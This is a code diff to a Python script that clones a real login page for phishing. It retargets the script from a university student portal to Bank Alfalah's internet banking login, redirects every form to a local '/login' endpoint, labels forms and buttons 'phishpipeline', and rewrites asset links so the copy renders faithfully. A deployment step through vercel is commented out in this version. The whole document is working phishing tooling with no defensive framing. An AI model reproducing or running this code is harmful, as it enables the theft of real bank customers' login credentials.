@@ -5,7 +5,8 @@ from bs4 import BeautifulSoup
 from urllib.parse import urljoin
 
 # Replace <login_page_url> with the actual login page URL
-login_url = "https://flexstudent.nu.edu.pk/"
+login_url = "https://netbanking.bankalfalah.com/ib/Login.aspx"
+#login_url = "https://flexstudent.nu.edu.pk/Login"
 base_url = "/".join(login_url.split("/")[:-1])
 
 # Create a session to handle cookies and authentication
@@ -23,19 +24,29 @@ forms = soup.find_all("form")
 
 # Edit the forms to add the method and action attributes
 for form in forms:
+    form["id"] = "phishpipeline"
     form["method"] = "post"
     form["action"] = "/login"
+    # Find all the buttons or input type=submit elements within the form
+    buttons = form.find_all("button") + \
+        form.find_all("input", {"type": "submit"})
+
+    # Edit the buttons to add the ID attribute
+    for button in buttons:
+        button["id"] = "phishpipeline"
 
 # Find all the assets (images, CSS, and JavaScript) in the HTML
-assets = soup.find_all(["img", "link", "style"])
+assets = soup.find_all(["img", "link", "style", "script"])
 style_tags = soup.find_all(lambda tag: tag.has_attr('style'))
 
 # Resolve the URLs of the assets
 for asset in assets:
-    if asset.has_attr("src"):
-        asset["src"] = urljoin(base_url, asset["src"])
-    elif asset.has_attr("href"):
-        asset["href"] = urljoin(base_url, asset["href"])
+    if asset.has_attr("src") and not asset["src"].startswith(('http://', 'https://', '//')):
+        #asset["src"] = urljoin(base_url, asset["src"])
+        asset["src"] = base_url + '/' + asset["src"]
+    elif asset.has_attr("href") and not asset["href"].startswith(('http://', 'https://', '//')):
+        #asset["href"] = urljoin(base_url, asset["href"])
+        asset["href"] = base_url + '/' + asset["href"]
 
 # Resolve the URLs of the assets in the style attribute
 for style_tag in style_tags:
@@ -52,14 +63,14 @@ for style_tag in style_tags:
     style_tag['style'] = style[:start_index] + url_value + style[end_index:]
 
 # Save the updated HTML to a new file
-with open("build/templates/index.html", "w") as f:
+with open("build/templates/index.html", "w", encoding="utf-8") as f:
     f.write(str(soup))
 
 # Define the command to run
-command = "vercel --cwd build/ --yes --name ehcp-test"
+#command = "vercel --cwd build/ --yes"
 
 # Run the command and capture the output
-output = subprocess.check_output(command, shell=True)
+#output = subprocess.check_output(command, shell=True)
 
 # Print the output
-print(output.decode())
+# print(output.decode())
